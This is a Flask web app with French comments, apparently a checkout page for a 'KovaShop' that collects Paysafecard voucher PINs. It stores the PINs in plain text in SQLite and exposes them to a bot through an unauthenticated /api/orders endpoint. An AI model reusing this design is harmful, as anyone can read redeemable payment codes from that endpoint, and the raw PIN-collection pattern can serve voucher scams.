from flask import Flask, request, render_template_string
import os
import sqlite3

app = Flask(__name__)
DELAY_HOURS = 2

# Initialisation de la base de données locale sur Render
def init_db():
    con = sqlite3.connect("render_data.db")
    con.execute("CREATE TABLE IF NOT EXISTS orders (invoice_id TEXT PRIMARY KEY, pin TEXT, amount TEXT)")
    con.commit()
    con.close()

init_db()

HTML = """
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8"><title>Paiement Paysafecard - KovaShop</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
    body { font-family: 'Inter', sans-serif; background: #0a0a0c; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
    .card { background: #14151a; border: 1px solid #2a2b33; border-radius: 16px; width: 100%; max-width: 440px; padding: 32px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
    .price { font-size: 24px; font-weight: 700; color: #2ecc71; margin-bottom: 24px; }
    input { width: 100%; padding: 16px; font-size: 18px; letter-spacing: 4px; text-align: center; border-radius: 10px; border: 1px solid #333; background: #0f1115; color: #fff; box-sizing: border-box; margin-top: 8px; margin-bottom: 20px;}
    button { width: 100%; padding: 16px; font-size: 16px; font-weight: 600; border-radius: 10px; border: 0; background: #2ecc71; color: #000; cursor: pointer; }
    .info { background: rgba(46, 204, 113, 0.1); border: 1px solid rgba(46, 204, 113, 0.2); padding: 16px; border-radius: 10px; margin-top: 24px; font-size: 13px; color: #2ecc71; text-align: center; }
  </style>
</head>
<body>
  <div class="card">
    <h1>Paiement Paysafecard</h1>
    <div class="price">Montant : {{ amount }} €</div>
    <form method="POST" action="/submit">
      <input type="hidden" name="invoice_id" value="{{ invoice_id }}">
      <input type="hidden" name="amount" value="{{ amount }}">
      <label>Code PIN Paysafecard (16 chiffres)</label>
      <input name="pin" maxlength="19" placeholder="1234 5678 9012 3456" required>
      <button type="submit">Envoyer mon code</button>
    </form>
    <div class="info">⏱️ Délai : {{ delay }}h max. Vérification manuelle.</div>
  </div>
</body>
</html>
"""

@app.route("/checkout")
def checkout():
    invoice_id = request.args.get("invoice_id") or "INCONNU"
    amount = request.args.get("amount") or "0.00"
    return render_template_string(HTML, invoice_id=invoice_id, amount=amount, delay=DELAY_HOURS)

@app.route("/submit", methods=["POST"])
def submit():
    invoice_id = request.form["invoice_id"]
    pin = request.form["pin"].strip().replace("-", "").replace(" ", "")
    amount = request.form.get("amount", "0.00")
    
    # On sauvegarde dans la base de données Render
    con = sqlite3.connect("render_data.db")
    con.execute("INSERT OR REPLACE INTO orders (invoice_id, pin, amount) VALUES (?, ?, ?)", (invoice_id, pin, amount))
    con.commit()
    con.close()
        
    return "<h2 style='color:#2ecc71;text-align:center;margin-top:100px;font-family:sans-serif;'>✅ Code envoyé !<br>Ta commande sera validée sous peu.</h2>"

# Petite API pour que le bot puisse lire les PIN
@app.route("/api/orders")
def api_orders():
    con = sqlite3.connect("render_data.db")
    rows = con.execute("SELECT invoice_id, pin, amount FROM orders").fetchall()
    con.close()
    return {"orders": [{"invoice_id": r[0], "pin": r[1], "amount": r[2]} for r in rows]}

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
